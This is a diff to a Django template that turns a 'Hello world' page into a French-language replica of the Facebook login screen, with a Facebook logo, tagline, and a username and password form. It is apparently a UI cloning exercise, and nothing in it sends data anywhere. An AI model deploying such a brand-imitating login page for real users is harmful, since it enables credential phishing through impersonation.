@@ -1,6 +1,24 @@
-{% extends 'app/layout/base.html' %}
+{% extends 'app/layout/base.html' %} {% load static %}
 
 
 {% block content %}
-<h1>Hello world !</h1>
+<div class="container-fluid">
+    <div class="row">
+        <div class="col-md-6 box-f">
+            <img src="{% static 'media/img/logo-f.svg' %}" width="350" height="200" alt="facbook"/>
+            <h2>Avec Facebook, partagez et restez en contact avec votre entourage.</h2>
+        </div>
+
+        <div class="col-md-6 box-content">
+            <form method="POST" action="" class="form-box"> {% csrf_token %}
+                <input type="text" name="username" class="form-control input-lg" placeholder="Adresse e-mail ou numéro de tél."> <br />
+                <input type="password" name="password" class="form-control input-lg" placeholder="Mot de passe"> <br />
+                <button type="button" class="btn btn-primary btn-lg d-grid gap-2 col-12">Se connecter</button> <br />
+
+                <p><a href="#">Mot de passe oublié ?</a></p> <hr >
+                <button type="button" class="btn btn-color d-grid gap-2 col-8 mx-auto btn-lg">Créer nouveau compte</button> <br />
+            </form>
+        </div>
+    </div>
+</div>
 {% endblock %}
